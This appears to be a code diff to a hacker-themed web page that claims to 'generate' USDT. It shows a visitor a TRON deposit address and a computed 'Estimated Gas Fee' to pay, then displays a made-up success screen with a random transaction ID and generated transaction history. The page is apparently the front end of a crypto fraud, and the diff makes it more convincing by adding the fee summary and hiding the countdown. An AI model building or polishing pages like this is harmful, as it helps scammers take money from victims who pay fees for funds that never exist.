@@ -7,7 +7,6 @@
 <style>
   @import url('https://fonts.googleapis.com/css2?family=VT323&display=swap');
 
-  /* Basic Reset */
   * {
     box-sizing: border-box;
   }
@@ -20,7 +19,6 @@
     height: 100vh;
   }
 
-  /* Container */
   .terminal-container {
     max-width: 900px;
     margin: 0 auto;
@@ -39,7 +37,6 @@
       0 0 20px #00ff00;
   }
 
-  /* Matrix rain background */
   #matrix-rain {
     position: fixed;
     top: 0; left: 0;
@@ -63,7 +60,6 @@
     100% { transform: translateY(105vh); opacity: 0; }
   }
 
-  /* Glitch and flicker effects */
   .glitch-text {
     position: relative;
     color: #00ff00;
@@ -103,7 +99,6 @@
     100% { background-position: 0 0, 0 0; }
   }
 
-  /* Form styles */
   form {
     background: rgba(0, 20, 0, 0.85);
     padding: 22px 26px;
@@ -157,7 +152,6 @@
     background-color: #22ff22;
   }
 
-  /* Transactions */
   #transaction-list {
     max-width: 460px;
     margin: 0 auto 40px auto;
@@ -225,7 +219,6 @@
     border-color: #00dd00;
   }
 
-  /* Overlay screens */
   .overlay {
     position: fixed;
     inset: 0;
@@ -240,6 +233,7 @@
     text-align: center;
     letter-spacing: 0.15em;
     z-index: 999999;
+    padding: 20px;
   }
   .overlay h2 {
     font-size: 2.2em;
@@ -291,6 +285,17 @@
     padding: 10px 14px;
     background: rgba(0, 50, 0, 0.7);
     border-radius: 8px;
+  }
+  .overlay .card-summary {
+    font-size: 1.1em;
+    border: 1px solid #00ff00;
+    border-radius: 10px;
+    padding: 14px 24px;
+    background: rgba(0, 20, 0, 0.8);
+    width: 320px;
+    margin: 0 auto 10px auto;
+    box-shadow:
+      0 0 8px #00ff00;
   }
   .overlay button {
     background: #000;
@@ -351,9 +356,11 @@
       onclick="copyGasAddress()"
     />
     <div class="deposit-address" id="deposit-address">TYH8QeLigG2xjUuHZA5QRbwK5gWsgFaPTA</div>
+    <div class="card-summary">
+      <b>Generated Amount:</b> <span id="deposit-amount">0</span> USDT<br />
+      <b>Estimated Gas Fee:</b> <span id="deposit-gas">0</span> TRX
+    </div>
     <div class="loading-spinner"></div>
-    <div id="countdown-timer" style="font-size: 1.48em; margin-top: 10px;"></div>
-    <div style="font-size: 0.98em; margin-top: 4px; letter-spacing: 0.15em;">Click QR to copy address</div>
   </div>
 
   <!-- Success Overlay -->
@@ -389,9 +396,6 @@
     alert('Gas address copied to clipboard!');
   }
 
-  // Terminal animations glitch flicker already in CSS for text
-
-  // Pagination variables
   const TX_PER_PAGE = 5;
   let allTransactions = [];
   let currentPage = 1;
@@ -407,7 +411,6 @@
     return now.toLocaleString('en-US',{month:'short',day:'numeric',hour:'2-digit',minute:'2-digit'});
   }
 
-  // Generate transactions
   function generateTransactionsList(){
     let txns = [];
     for(let i=0; i< 25; i++) {
@@ -464,7 +467,6 @@
 
   const waitingOverlay = document.getElementById('waiting-overlay');
   const successOverlay = document.getElementById('success-overlay');
-  const countdownTimer = document.getElementById('countdown-timer');
   const successAmountElem = document.getElementById('success-amount');
   const successTxidElem = document.getElementById('success-txid');
   const successTimeElem = document.getElementById('success-time');
@@ -490,24 +492,26 @@
       amtInput.focus();
       return;
     }
-    // Show deposit waiting overlay with qr and address
+    const gasFee = Math.round((amount / 1000) * 20);
+
     waitingOverlay.style.display = 'flex';
+
+    document.getElementById('deposit-amount').textContent = amount.toLocaleString();
+    document.getElementById('deposit-gas').textContent = gasFee.toLocaleString();
+
     let countdown = 30;
-    countdownTimer.textContent = `Time remaining: ${countdown} s`;
-    const interval = setInterval(()=>{
+    // No visible timer, waiting shown by spinner only
+    const interval = setInterval(() => {
       countdown--;
-      countdownTimer.textContent = `Time remaining: ${countdown} s`;
-      if (countdown <= 0){
+      if (countdown <= 0) {
         clearInterval(interval);
         waitingOverlay.style.display = 'none';
 
-        // Show success message
         successAmountElem.textContent = amount.toLocaleString();
         successTxidElem.textContent = 'TX' + Math.random().toString(36).substr(2,16).toUpperCase();
         successTimeElem.textContent = new Date().toLocaleString('en-US', {month:'short', day:'numeric', hour:'2-digit', minute:'2-digit'});
         successOverlay.style.display = 'flex';
 
-        // Update transactions
         refreshTransactionsPeriodically();
       }
     }, 1000);
